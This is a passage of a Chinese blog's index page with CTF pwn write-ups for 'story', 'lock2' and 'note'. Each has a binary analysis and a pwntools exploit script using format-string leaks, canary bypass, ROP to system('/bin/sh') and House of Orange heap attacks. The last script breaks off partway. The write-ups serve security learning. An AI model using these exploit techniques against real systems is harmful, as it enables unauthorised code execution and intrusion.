<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="陈戳戳的日记本"><meta name="keywords" content><meta name="author" content="Po1lux"><meta name="copyright" content="Po1lux"><title>Po1lux's Diary</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG.jpg"></div><div class="author-info__name text-center">Po1lux</div><div class="author-info__description text-center">陈戳戳的日记本</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">49</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">28</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">4</span></a></div></div></div><nav id="nav" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Po1lux's Diary</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">Po1lux's Diary</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/09/2019-西湖论剑CTF-story/">2019-西湖论剑CTF-story</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/fmt/">fmt</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/rop/">rop</a></span><div class="content"><h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Canary</span>                        <span class="string">:</span> <span class="literal">Yes</span> <span class="string">&#x2192;</span>  <span class="attr">value:</span> <span class="number">0xf2afb7df22cc0200</span></span><br><span class="line"><span class="string">NX</span>                            <span class="string">:</span> <span class="literal">Yes</span></span><br><span class="line"><span class="string">PIE</span>                           <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">Fortify</span>                       <span class="string">:</span> <span class="literal">No</span></span><br><span class="line"><span class="string">RelRO</span>                         <span class="string">:</span> <span class="string">Full</span></span><br></pre></td></tr></table></figure>
<p>&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_400915</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please Tell Your ID:&quot;</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, <span class="number">0x32</span>uLL);</span><br><span class="line">  v0 = strdup(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello &quot;</span>, <span class="number">50L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x51FD;&#x6570;sub_400ABE&#xFF0C;&#x529F;&#x80FD;&#x5C31;&#x662F;&#x5411;s&#x4E2D;&#x5199;&#x5165;v1&#x957F;&#x5EA6;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4F46;&#x662F;s&#x957F;&#x5EA6;&#x5E76;&#x6CA1;&#x6709;&#x5927;&#x5230;1024&#xFF0C;&#x6240;&#x4EE5;&#x5B58;&#x5728;&#x6EA2;&#x51FA;&#xFF0C;&#x53EF;&#x4EE5;&#x8986;&#x76D6;sub_4009A0&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">sub_4009A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Tell me the size of your story:&quot;</span>);</span><br><span class="line">  v1 = sub_400A54();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = -v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">128</span> )</span><br><span class="line">    v1 = <span class="number">1024L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can speak your story:&quot;</span>);</span><br><span class="line">  sub_400ABE((__int64)&amp;s, v1);</span><br><span class="line">  <span class="keyword">return</span> strdup(&amp;s);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></p>
<h2 id="0x01-&#x601D;&#x8DEF;"><a href="#0x01-&#x601D;&#x8DEF;" class="headerlink" title="0x01 &#x601D;&#x8DEF;"></a>0x01 &#x601D;&#x8DEF;</h2><p>&#x7A0B;&#x5E8F;&#x5B58;&#x5728;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x3001;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5B58;&#x5728;Canary&#xFF0C;&#x672A;&#x5F00;&#x542F;PIE</p>
<ul>
<li>&#x5229;&#x7528;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x83B7;&#x5F97;&#x6808;&#x4E0A;&#x7684;Canary</li>
<li>&#x5229;&#x7528;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6F0F;&#x6D1E;&#x6253;&#x5370;&#x51FD;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x641C;&#x7D22;libc&#x7684;&#x7248;&#x672C;&#xFF0C;&#x83B7;&#x53D6;&#x504F;&#x79FB;&#xFF0C;&#x8BA1;&#x7B97;&#x5F97;&#x5230;-libc_base&#xFF0C;&#x8BA1;&#x7B97;&#x5F97;&#x5230;system&#x3001;/bin/sh&#x3001;pop rdi&#xFF1B;ret&#x7684;&#x5730;&#x5740;</li>
<li>&#x5229;&#x7528;&#x6808;&#x6EA2;&#x51FA;&#x52AB;&#x6301;&#x7A0B;&#x5E8F;&#x6D41;</li>
</ul>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">REMOTE = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> REMOTE:</span><br><span class="line">	p = remote(<span class="string">&apos;ctf1.linkedbyx.com&apos;</span>,<span class="number">10255</span>)</span><br><span class="line"><span class="keyword">else</span>:	</span><br><span class="line">	p = process(<span class="string">&apos;./story&apos;</span>)</span><br><span class="line"></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	raw_input(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&apos;./story&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc.so.6&apos;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400bd3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Please Tell Your ID:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;%11$p#%15$p#&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Hello &apos;</span>)</span><br><span class="line">	libc_base = int(p.recvuntil(<span class="string">&apos;#&apos;</span>,drop = <span class="keyword">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&apos;_IO_file_setbuf&apos;</span>]<span class="number">-9</span></span><br><span class="line">	log.success(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">	binsh = libc_base + libc.search(<span class="string">&apos;/bin/sh\x00&apos;</span>).next()</span><br><span class="line">	system = libc_base + libc.symbols[<span class="string">&apos;system&apos;</span>]</span><br><span class="line">	canary = int(p.recvuntil(<span class="string">&apos;#&apos;</span>,drop = <span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">	log.success(<span class="string">&apos;canary: &apos;</span>+hex(canary))</span><br><span class="line">	<span class="comment">#one_gadgets = libc_base + 0xf1147</span></span><br><span class="line">	<span class="comment">#log.success(&apos;one_gadgets: &apos;+hex(one_gadgets))</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Tell me the size of your story:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;200&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;You can speak your story:&apos;</span>)</span><br><span class="line">	payload = <span class="string">&apos;a&apos;</span>*<span class="number">136</span>+p64(canary)*<span class="number">2</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<p>&#x9996;&#x5148;&#x7528;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x6CC4;&#x9732;libc&#x548C;canary&#xFF0C;&#x5728;&#x7528;&#x6EA2;&#x51FA;&#x4FEE;&#x6539;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x83B7;&#x5F97;shell</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/04/2018-SUCTF-lock2-fmt-栈溢出-Canary/">2018-SUCTF-lock2-[fmt,栈溢出,Canary]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-04</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/64bit/">64bit</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/格式化字符串漏洞/">格式化字符串漏洞</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/栈溢出/">栈溢出</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Canary/">Canary</a></span><div class="content"><h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : Yes</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure>
<p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x903B;&#x8F91;&#xFF0C;&#x901A;&#x8FC7;&#x683C;&#x5F0F;&#x5316;&#x5B57;&#x7B26;&#x4E32;&#x5C06;3&#x4E2A;&#x5730;&#x5740;&#x8986;&#x76D6;&#x6210;&#x76F8;&#x5E94;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x5165;&#x4E00;&#x4E2A;&#x53EB;final&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5176;&#x4E2D;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;&#x5C06;final&#x51FD;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x8986;&#x76D6;&#x6210;&#x4E00;&#x4E2A;&#x53EB;flag&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;flag&#x4E86;&#x3002;&#x5728;&#x8986;&#x76D6;&#x8FD4;&#x56DE;&#x5730;&#x5740;&#x65F6;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x6808;&#x6EA2;&#x51FA;&#x83B7;&#x5F97;Canary&#x7684;&#x503C;&#xFF0C;&#x518D;&#x628A;&#x503C;&#x5199;&#x5165;rbp&#x4E0B;&#x9762;(Canary&#x6BD4;rbp&#x5730;&#x5740;&#x4F4E;)</p>
<h2 id="0x01-EXP"><a href="#0x01-EXP" class="headerlink" title="0x01 EXP"></a>0x01 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&apos;./lock2&apos;</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;password:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;123456&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;K  &apos;</span>)</span><br><span class="line">  <span class="comment">#&#x83B7;&#x5F97;&#x95E8;&#x9501;&#x5730;&#x5740;</span></span><br><span class="line">  keyaddr = int(p.recvuntil(<span class="string">&apos;--------&apos;</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">  <span class="comment">#&#x5C06;&#x4E09;&#x4E2A;&#x5730;&#x5740;&#x8986;&#x76D6;&#x4E3A;&#x771F;(2)</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;cmd:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;aa%7$naa&apos;</span>+p64(keyaddr))<span class="comment">#C0</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;invalid&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;cmd:&apos;</span>)</span><br><span class="line">  p.sendline(<span class="string">&apos;aa%7$naa&apos;</span>+p64(keyaddr+<span class="number">4</span>))<span class="comment">#C4</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;invalid&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;cmd:&apos;</span>)</span><br><span class="line">  p.sendline(<span class="string">&apos;aa%7$naa&apos;</span>+p64(keyaddr+<span class="number">0x14</span>))<span class="comment">#D4</span></span><br><span class="line">  p.recvuntil(<span class="string">&apos;invalid&apos;</span>)</span><br><span class="line">  <span class="comment">#&#x83B7;&#x5F97;flag&#x51FD;&#x6570;&#x5730;&#x5740;</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;The Pandora Box:&apos;</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">	flag = int(p.recvuntil(<span class="string">&apos;\n&apos;</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">  <span class="comment">#&#x5C06;\x00&#x8986;&#x76D6;&#xFF0C;&#x591A;&#x6253;&#x5370;&#x51FA;&#x6808;&#x4E0A;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5305;&#x62EC;Canary</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Tell me your name:&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;b&apos;</span>*<span class="number">0x18</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;b&apos;</span>*<span class="number">0x18</span>+<span class="string">&apos;\x0a&apos;</span>)</span><br><span class="line">	Canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">  <span class="comment">#&#x8986;&#x76D6;&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x5730;&#x5740;</span></span><br><span class="line">	p.sendline(<span class="string">&apos;c&apos;</span>*<span class="number">34</span>+p64(Canary)+<span class="string">&apos;rbprbprb&apos;</span>+p64(flag))</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/01/2018-SUCTF-note/">2018-SUCTF-note</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-01</time><div class="content"><h2 id="0x00-&#x603B;&#x7ED3;"><a href="#0x00-&#x603B;&#x7ED3;" class="headerlink" title="0x00 &#x603B;&#x7ED3;"></a>0x00 &#x603B;&#x7ED3;</h2><p>House of Orange&#x7684;&#x7B2C;&#x4E00;&#x6B65;&#x662F;&#x6CC4;&#x9732;libc&#x7684;&#x5730;&#x5740;</p>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE;unsortedbin&#x7684;chunk&#x4E2D;&#x83B7;&#x53D6;&#x3002;2014Hitcon&#x90A3;&#x9898;&#x662F;&#x901A;&#x8FC7;glibc&#x91CA;&#x653E;&#x4E86;topchunk&#x83B7;&#x53D6;&#x7684;libc&#x5730;&#x5740;&#xFF0C;&#x8FD9;&#x9898;&#x662F;&#x9898;&#x76EE;&#x81EA;&#x5E26;&#x4E86;&#x4E00;&#x4E2A;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x4E00;&#x6B21;&#x7684;free&#x529F;&#x80FD;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;unsortedbin chunk&#xFF0C;&#x8FD9;&#x6837;chunk&#x7684;fd&#x3001;bk&#x4E2D;&#x5C31;&#x6CC4;&#x9732;&#x4E86;libc&#x7684;&#x5730;&#x5740;</p>
<p>&#x7B2C;&#x4E8C;&#x6B65;&#x662F;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;&#x5230;unsortedbin chunk&#xFF0C;&#x4FEE;&#x6539;bk&#xFF0C;&#x5B9E;&#x73B0;unsortedbin attack</p>
<h2 id="0x01-&#x4F7F;&#x7528;House-of-Orange"><a href="#0x01-&#x4F7F;&#x7528;House-of-Orange" class="headerlink" title="0x01 &#x4F7F;&#x7528;House of Orange"></a>0x01 &#x4F7F;&#x7528;House of Orange</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">&apos;/opt/glibc-2.24/lib/ld-linux-x86-64.so.2&apos;</span>,<span class="string">&apos;--library-path&apos;</span>,<span class="string">&apos;/opt/glibc-2.24/lib/&apos;</span>,<span class="string">&apos;./note&apos;</span>])</span><br><span class="line">elf = ELF(<span class="string">&apos;./note&apos;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;/opt/glibc-2.24/lib/libc-2.24.so&apos;</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="keyword">if</span> VERBOSE:</span><br><span class="line">	context(log_level = <span class="string">&apos;debug&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">(s = <span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	<span class="keyword">if</span> s != <span class="string">&apos;&apos;</span>:</span><br><span class="line">		raw_input(s)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Choice&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Size:&apos;</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Content:&apos;</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Choice&gt;&gt;&apos;</span>)</span><br><span class="line">        p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Index:&apos;</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">&apos;Choice&gt;&gt;&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;(yes:1)&apos;</span>)</span><br><span class="line">	p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">&apos;2&apos;</span>*<span class="number">0x10</span>)</span><br><span class="line">	q()</span><br><span class="line">	<span class="comment">#leak address</span></span><br><span class="line">	box()</span><br><span class="line">	q()</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&apos;Content:&apos;</span>)</span><br><span class="line">	leak_addr = u64(p.recvuntil(<span class="string">&apos;\x0a&apos;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))</span><br><span class="line">	libc_base = leak_addr - <span class="number">0x398b00</span> - <span class="number">88</span></span><br><span class="line">	